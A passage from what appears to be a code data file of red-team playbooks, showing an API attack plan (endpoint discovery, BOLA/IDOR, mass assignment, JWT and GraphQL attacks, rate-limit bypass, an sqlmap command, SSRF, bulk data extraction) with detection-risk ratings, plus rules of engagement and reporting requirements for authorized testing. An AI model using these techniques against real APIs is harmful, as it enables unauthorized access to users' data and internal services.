        { step: 3, tool: "curl", command: "curl https://api.target.com/swagger.json; curl https://api.target.com/openapi.yaml", detection_risk: "low" },
        { step: 4, tool: "Postman", command: "Import discovered endpoints, test authentication mechanisms", detection_risk: "low" }
      ]},
      { name: "Vulnerability Testing", activities: [
        { step: 1, tool: "Burp", command: "Test BOLA/IDOR: change user ID in requests to access other users' data", detection_risk: "medium" },
        { step: 2, tool: "Burp Intruder", command: "Mass assignment: add admin=true, role=admin to registration/update requests", detection_risk: "medium" },
        { step: 3, tool: "jwt_tool", command: "Test JWT: none algorithm, weak secret, key confusion, kid injection", detection_risk: "medium" },
        { step: 4, tool: "GraphQL", command: "Introspection query, batch queries, nested query DoS, field suggestion enumeration", detection_risk: "medium" },
        { step: 5, tool: "Burp", command: "Rate limiting bypass: header rotation (X-Forwarded-For), parameter pollution", detection_risk: "medium" }
      ]},
      { name: "Exploitation", activities: [
        { step: 1, tool: "curl", command: "Chain BOLA + missing function level authorization to access admin API", detection_risk: "high" },
        { step: 2, tool: "sqlmap", command: "sqlmap -u 'https://api.target.com/users?search=test' --headers='Authorization: Bearer TOKEN'", detection_risk: "high" },
        { step: 3, tool: "Manual", command: "Exploit SSRF in webhook/callback URL parameter to access internal services", detection_risk: "high" }
      ]}
    ],
    c2_setup: ["No C2 needed — direct API interaction"],
    exfil_methods: ["Bulk API data extraction via BOLA", "SQL injection data dump", "SSRF to internal service data access"],
    cleanup: ["Document all accessed endpoints and data", "Report rate limiting gaps", "No persistent access to clean up"]
  }
];

export const RED_TEAM_METHODOLOGY = {
  rules_of_engagement: [
    "Written authorization required before any testing begins",
    "Defined scope with explicit in-scope and out-of-scope targets",
    "Emergency contact procedures established",
    "Data handling and destruction procedures agreed upon",
    "Legal review completed for all testing activities",
    "Notification procedures for critical findings",
    "Testing windows and blackout periods defined"
  ],
  opsec_guidelines: [
    "Use dedicated attack infrastructure (not personal devices)",
    "VPN/proxy for all connections to target environment",
    "Separate communication channels for team coordination",
    "Avoid testing during business-critical operations unless approved",
    "Document all actions with timestamps for deconfliction",
    "Immediately report any unintended impact or data exposure",
    "Use encrypted storage for all collected evidence and credentials"
  ],
  reporting_requirements: [
    "Executive summary with risk ratings",
    "Detailed technical findings with reproduction steps",
    "Evidence (screenshots, logs, captured data samples)",
    "Attack path diagrams showing kill chain",
    "Risk-rated recommendations prioritized by impact",
    "Remediation verification plan",
    "Appendices with raw tool output and methodology notes"
  ]
};
